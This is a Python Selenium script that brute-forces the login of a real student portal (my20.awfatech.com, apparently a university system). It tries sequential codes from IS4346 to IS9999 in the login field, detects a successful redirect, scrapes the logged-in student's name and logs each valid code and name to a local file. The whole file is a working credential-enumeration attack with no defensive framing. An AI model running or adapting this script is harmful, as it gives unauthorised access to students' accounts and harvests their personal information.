import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

SUCCESS_URL = "https://my20.awfatech.com/main/appstudent/main/index.php"
OUTPUT_FILE = "/Users/parvinabaleava/Downloads/Coding/txt.txt"


def generate_prefix(number):
    return f"IS{str(number).zfill(4)}"


def log_success(prefix, name):
    with open(OUTPUT_FILE, "a") as f:
        f.write(f"{prefix} | {name}\n")
    print(f"[SUCCESS] {prefix} | {name} — logged to {OUTPUT_FILE}")


def get_student_name(driver):
    try:
        name_element = WebDriverWait(driver, 5).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR, ".text-white.text-uppercase"))
        )
        return name_element.text.strip()
    except Exception:
        return "UNKNOWN"


def main():
    url = "https://my20.awfatech.com/main/appstudent/adm/index.php?sysapp=iium&apps=student"

    input_xpath = "//*[@id=\"section-0\"]/div[3]/div[2]/div/div[2]/div/div/table/tbody/tr/td/table/tbody/tr[2]/td/input"
    button_xpath = "//button[@type='button']"

    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(url)

        for number in range(4346, 10000):
            prefix = generate_prefix(number)

            # Wait for input to be visible
            input_box = WebDriverWait(driver, 10).until(
                EC.visibility_of_element_located((By.XPATH, input_xpath))
            )

            input_box.clear()
            input_box.send_keys(prefix)

            # Wait for button and click
            login_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, button_xpath))
            )
            login_button.click()

            # Wait briefly for redirect
            time.sleep(0.1)

            # Check if URL changed to success URL
            current_url = driver.current_url
            if SUCCESS_URL in current_url:
                student_name = get_student_name(driver)
                log_success(prefix, student_name)
                # Navigate back to start for next attempt
                driver.get(url)
            else:
                print(f"[FAIL] {prefix} — no redirect")

    except Exception as e:
        print("Error:", e)

    finally:
        driver.quit()


if __name__ == "__main__":
    main()